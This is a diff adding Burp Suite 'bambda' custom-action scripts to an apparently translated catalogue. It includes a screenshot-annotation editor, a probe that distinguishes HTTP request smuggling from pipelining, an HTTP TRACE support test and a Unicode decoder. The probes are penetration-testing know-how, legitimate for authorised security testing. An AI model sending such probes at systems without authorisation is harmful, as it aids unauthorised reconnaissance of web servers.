+                start[0]=e.getPoint();
+                if("DRAW".equals(mode[0])){
+                    path = new java.awt.geom.Path2D.Double();
+                    path.moveTo(e.getX(),e.getY());
+                    preview[0]=path;
+                }
+            }
+            public void mouseDragged(java.awt.event.MouseEvent e){
+                if(start[0]==null) return;
+                java.awt.Point p=e.getPoint();
+                switch(mode[0]){
+                    case "LINE":
+                        preview[0]=new java.awt.geom.Line2D.Double(start[0],p);
+                        break;
+                    case "DRAW":
+                        path.lineTo(p.getX(),p.getY());
+                        break;
+                    default:
+                        int x=java.lang.Math.min(start[0].x,p.x);
+                        int y=java.lang.Math.min(start[0].y,p.y);
+                        int w=java.lang.Math.abs(p.x-start[0].x);
+                        int h=java.lang.Math.abs(p.y-start[0].y);
+                        preview[0]=new java.awt.geom.Rectangle2D.Double(x,y,w,h);
+                }
+                draw.repaint();
+            }
+            public void mouseReleased(java.awt.event.MouseEvent e){
+                if(preview[0]!=null){
+                    java.awt.Color c;
+                    if("HIGHLIGHT".equals(mode[0]))
+                        c=new java.awt.Color(curCol[0].getRed(),curCol[0].getGreen(),
+                                             curCol[0].getBlue(),80);
+                    else if("REDACT".equals(mode[0])) c=java.awt.Color.BLACK;
+                    else c=curCol[0];
+                    shapes.add(preview[0]); cols.add(c); kinds.add(mode[0]);
+                }
+                start[0]=null; preview[0]=null; draw.repaint();
+            }
+        };
+        draw.addMouseListener(dm); draw.addMouseMotionListener(dm);
+
+        /* ----- toolbar ----- */
+        javax.swing.JPanel bar = new javax.swing.JPanel(new java.awt.GridLayout(0,1,0,8));
+        bar.setBorder(javax.swing.BorderFactory.createEmptyBorder(8,8,8,8));
+        bar.setPreferredSize(new java.awt.Dimension(180, snap.getHeight()));
+        root.add(bar, java.awt.BorderLayout.EAST);
+
+        /* buttons */
+        javax.swing.JButton colourBtn      = new javax.swing.JButton("Colour"); colourBtn.setOpaque(true);
+        javax.swing.JToggleButton redactBtn= new javax.swing.JToggleButton("Hide");
+        javax.swing.JToggleButton lineBtn  = new javax.swing.JToggleButton("Line");
+        javax.swing.JToggleButton drawBtn  = new javax.swing.JToggleButton("Draw");
+        javax.swing.JToggleButton rectBtn  = new javax.swing.JToggleButton("Rectangle", true);
+        javax.swing.JToggleButton hiBtn    = new javax.swing.JToggleButton("Highlight");
+        javax.swing.JButton undoBtn = new javax.swing.JButton("\u2190 Undo");
+        javax.swing.JButton copyBtn = new javax.swing.JButton("Copy");
+        javax.swing.JButton saveBtn = new javax.swing.JButton("Save");
+
+        javax.swing.ButtonGroup grp = new javax.swing.ButtonGroup();
+        grp.add(rectBtn); grp.add(lineBtn); grp.add(drawBtn);
+        grp.add(hiBtn);   grp.add(redactBtn);
+
+        java.util.List<javax.swing.AbstractButton> allBtns =
+            java.util.Arrays.asList(colourBtn, redactBtn, lineBtn, drawBtn,
+                                    rectBtn, hiBtn, undoBtn, copyBtn, saveBtn);
+        allBtns.forEach(b-> b.setFont(
+                b.getFont().deriveFont(java.awt.Font.BOLD,
+                                       b.getFont().getSize()+2f)));
+
+        java.lang.Runnable refreshIcons = ()->{
+            rectBtn.setIcon(makeIcon.apply(curCol[0],"RECT"));
+            lineBtn.setIcon(makeIcon.apply(curCol[0],"LINE"));
+            drawBtn.setIcon(makeIcon.apply(curCol[0],"DRAW"));
+            hiBtn.setIcon(makeIcon.apply(curCol[0],"HIGHLIGHT"));
+            redactBtn.setIcon(makeIcon.apply(curCol[0],"REDACT"));
+            colourBtn.setBackground(curCol[0]);
+        };
+        refreshIcons.run();
+
+        java.awt.event.ActionListener modeSel = a->{
+            if(a.getSource()==rectBtn)      mode[0]="RECT";
+            else if(a.getSource()==lineBtn) mode[0]="LINE";
+            else if(a.getSource()==drawBtn) mode[0]="DRAW";
+            else if(a.getSource()==hiBtn)   mode[0]="HIGHLIGHT";
+            else if(a.getSource()==redactBtn)mode[0]="REDACT";
+            draw.setCursor(java.awt.Cursor.getPredefinedCursor(
+                    "LINE".equals(mode[0]) ? java.awt.Cursor.DEFAULT_CURSOR
+                                           : java.awt.Cursor.CROSSHAIR_CURSOR));
+        };
+        rectBtn.addActionListener(modeSel); lineBtn.addActionListener(modeSel);
+        drawBtn.addActionListener(modeSel); hiBtn.addActionListener(modeSel);
+        redactBtn.addActionListener(modeSel);
+
+        colourBtn.addActionListener(a->{
+            java.awt.Color chosen = javax.swing.JColorChooser
+                    .showDialog(editor,"Choose colour",curCol[0]);
+            if(chosen!=null){ curCol[0]=chosen; refreshIcons.run(); }
+        });
+
+        undoBtn.addActionListener(a->{
+            if(!shapes.isEmpty()){
+                shapes.remove(shapes.size()-1);
+                cols.remove(cols.size()-1);
+                kinds.remove(kinds.size()-1);
+                draw.repaint();
+            }
+        });
+
+        java.awt.event.ActionListener saveCopy = a->{
+            try{
+                java.awt.image.BufferedImage out =
+                    new java.awt.image.BufferedImage(snap.getWidth(),snap.getHeight(),
+                                                     java.awt.image.BufferedImage.TYPE_INT_ARGB);
+                java.awt.Graphics2D g2 = out.createGraphics();
+                g2.drawImage(snap,0,0,null);
+                g2.setStroke(new java.awt.BasicStroke(3f));
+                for(int i=0;i<shapes.size();i++){
+                    g2.setColor(cols.get(i));
+                    if("HIGHLIGHT".equals(kinds.get(i))||"REDACT".equals(kinds.get(i)))
+                        g2.fill(shapes.get(i));
+                    else g2.draw(shapes.get(i));
+                }
+                g2.dispose();
+
+                if(a.getSource()==copyBtn){
+                    java.awt.datatransfer.Transferable t = new java.awt.datatransfer.Transferable(){
+                        public java.lang.Object getTransferData(
+                                java.awt.datatransfer.DataFlavor f)
+                                throws java.awt.datatransfer.UnsupportedFlavorException{
+                            if(f.equals(java.awt.datatransfer.DataFlavor.imageFlavor)) return out;
+                            throw new java.awt.datatransfer.UnsupportedFlavorException(f);
+                        }
+                        public java.awt.datatransfer.DataFlavor[] getTransferDataFlavors(){
+                            return new java.awt.datatransfer.DataFlavor[]{java.awt.datatransfer.DataFlavor.imageFlavor};
+                        }
+                        public boolean isDataFlavorSupported(java.awt.datatransfer.DataFlavor f){
+                            return f.equals(java.awt.datatransfer.DataFlavor.imageFlavor);
+                        }
+                    };
+                    java.awt.Toolkit.getDefaultToolkit().getSystemClipboard()
+                                     .setContents(t,null);
+                    javax.swing.JOptionPane.showMessageDialog(editor,"Image copied to clipboard.");
+                }else{
+                    java.io.File dir = new java.io.File(
+                            System.getProperty("user.home"));
+                    javax.swing.JFileChooser fc = new javax.swing.JFileChooser(dir);
+                    fc.setSelectedFile(new java.io.File("Burp_screenshot.png"));
+                    if(fc.showSaveDialog(editor)==javax.swing.JFileChooser.APPROVE_OPTION){
+                        java.io.File f = fc.getSelectedFile();
+                        javax.imageio.ImageIO.write(out,"png",f);
+                        if(java.awt.Desktop.isDesktopSupported()){
+                            java.awt.Desktop d = java.awt.Desktop.getDesktop();
+                            if(d.isSupported(java.awt.Desktop.Action.OPEN)) d.open(f);
+                        }
+                    }
+                    editor.dispose();
+                }
+            }catch(java.lang.Exception ex){ ex.printStackTrace(); }
+        };
+        copyBtn.addActionListener(saveCopy); saveBtn.addActionListener(saveCopy);
+
+        /* assemble toolbar */
+        bar.add(colourBtn);
+        bar.add(redactBtn);
+        bar.add(lineBtn);
+        bar.add(drawBtn);
+        bar.add(rectBtn);
+        bar.add(hiBtn);
+        bar.add(undoBtn);
+        javax.swing.JSeparator sep = new javax.swing.JSeparator(
+                javax.swing.SwingConstants.HORIZONTAL);
+        sep.setPreferredSize(new java.awt.Dimension(100,2));
+        bar.add(sep);
+        bar.add(copyBtn);
+        bar.add(saveBtn);
+
+        /* show editor */
+        editor.pack();
+        editor.setMinimumSize(new java.awt.Dimension(minW+180, minH));
+        editor.setLocationRelativeTo(null);
+        draw.setCursor(java.awt.Cursor.getPredefinedCursor(
+                java.awt.Cursor.CROSSHAIR_CURSOR));
+        editor.setVisible(true);
+
+    }catch(java.lang.Exception ex){ ex.printStackTrace(); }
+});
+
+/* ── show overlay ─────────────────────────────────────────── */
+overlay.setVisible(true);
+
+```
+## [SmugglingOrPipelining.bambda](https://github.com/PortSwigger/bambdas/blob/main/CustomAction/SmugglingOrPipelining.bambda)
+### 识别包含两个响应头行的响应是由管道化还是请求走私引起的。准确率 98%。更多信息：https://portswigger.net/research/smuggling-or-pipelining
+#### 作者：James Kettle (https://github.com/albinowax)
+```java
+
+if (!requestResponse.response().bodyToString().contains("HTTP/1")) {
+    logging().logToOutput("This script should only be run on a nested response");
+	return;
+}
+
+var req = requestResponse.request();
+if (req.contains("HTTP/2 ", true)) {
+    logging().logToOutput("This looks like smuggling, as it has a HTTP/1 response nested inside a HTTP/2 response");
+    return;
+}
+
+HttpRequest probe = HttpRequest.httpRequest(req.httpService(), req.toByteArray().subArray(0, req.toByteArray().length()-1));
+RequestOptions options = RequestOptions.requestOptions().withResponseTimeout(5000).withHttpMode(HttpMode.HTTP_1);
+HttpRequestResponse resp = api().http().sendRequest(probe, options);
+if (resp.hasResponse()) {
+     logging().logToOutput("Looks like pipelining");
+} else {
+     logging().logToOutput("Looks like smuggling");
+}
+logging().logToOutput("For further information, refer to https://portswigger.net/research/smuggling-or-pipelining");
+
+```
+## [TestHTTPTRACESupport.bambda](https://github.com/PortSwigger/bambdas/blob/main/CustomAction/TestHTTPTRACESupport.bambda)
+### 测试对 HTTP Trace 方法的支持。
+#### 作者：righettod (https://github.com/righettod)
+```java
+var req = requestResponse.request();
+var httpCode = api().http().sendRequest(req.withMethod("TRACE")).response().statusCode();
+logging().logToOutput("HTTP " + httpCode + " returned.");
+
+```
+## [Unicode-decodeSelectedText.bambda](https://github.com/PortSwigger/bambdas/blob/main/CustomAction/Unicode-decodeSelectedText.bambda)
+### Unicode 解码选定的文本。
+#### 作者：PortSwigger
+```java
+Pattern pattern = Pattern.compile("\\\\u([0-9a-fA-F]{4})");
+String selectedResponseText = selection.responseSelection().contents().toString();
+logging().logToOutput(pattern.matcher(selectedResponseText).replaceAll(match -> String.valueOf((char) Integer.parseInt(match.group(1), 16))));
+
+```
